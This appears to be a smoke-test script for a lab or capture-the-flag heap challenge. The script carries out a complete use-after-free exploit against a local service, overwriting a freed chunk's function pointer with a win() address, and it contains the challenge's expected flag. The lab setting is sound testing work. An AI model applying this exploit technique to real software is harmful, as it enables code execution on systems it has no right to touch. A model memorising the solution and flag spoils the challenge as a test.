#!/usr/bin/env python3
"""Smoke test for uaf_heap-002 (port 9987): use-after-free on a
safe-linked tcache, no-PIE.

The menu protocol (1=alloc 2=free 3=edit 4=call 5=quit):
  1. alloc: the service prints "alloc: 0x<addr>" (the chunk leak, the
     mangling's pos - the exploit notes it but never uses it: the
     dangling pointer path needs no unmangling).
  2. free: the chunk lands in the tcache (its first word becomes the
     MANGLED next pointer), `held` keeps pointing at it (the UAF).
  3. edit: the exploit writes the win() address (hex text) straight
     through the dangling pointer into the fn slot - the mangled next
     is irrelevant: the slot is overwritten, not poisoned.
  4. call: the service fires the freed chunk's fn - win() runs (the
     alloc'd chunk would fail the freed check; the freed one passes).

win() is at 0x4011f6 (measured in the lab container, no-PIE: fixed).

Success output:

  FLAG: FLAG{mr5_uaf_safe_linking}
"""

import re
import socket

HOST = "127.0.0.1"
PORT = 9987

WIN = 0x4011F6


def recv_until(s, needle, limit=4096):
    data = b""
    while needle not in data and len(data) < limit:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    menu = recv_until(s, b"5=quit\n")
    print(f"[+] menu: {menu.decode(errors='replace').strip()}")

    # 1. alloc: the chunk address rides out (the recon)
    s.send(b"1\n")
    out = recv_until(s, b"alloc: ")
    m = re.search(rb"alloc: 0x([0-9a-f]+)", out)
    assert m, f"no chunk leak: {out!r}"
    chunk = int(m.group(1), 16)
    print(f"[+] chunk at {chunk:#x} (leaked, not needed for the straight path)")

    # 2. free: the chunk goes to the tcache (safe-linked), held stays
    s.send(b"2\n")
    out = recv_until(s, b"free: ")
    assert b"safe-linked" in out, f"no free echo: {out!r}"
    print("[+] freed (tcache, safe-linked next)")

    # 3. edit: the win() address lands in the fn slot (hex text)
    s.send(b"3\n")
    s.send(f"{WIN:x}\n".encode())
    out = recv_until(s, b"edit: ")
    print(f"[+] edit echo: {out.decode(errors='replace').strip()}")

    # 4. call: the freed chunk's fn fires - win() reads the flag
    s.send(b"4\n")
    out = recv_until(s, b"FLAG:")
    try:
        out += s.recv(4096)
    except (socket.timeout, TimeoutError):
        pass  # the flag line was the last output; nothing follows it
    print(f"[+] output: {out.strip()[-60:]!r}")
    assert b"FLAG{mr5_uaf_safe_linking}" in out, "oracle flag missing"
    print("[+] uaf_heap-002 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
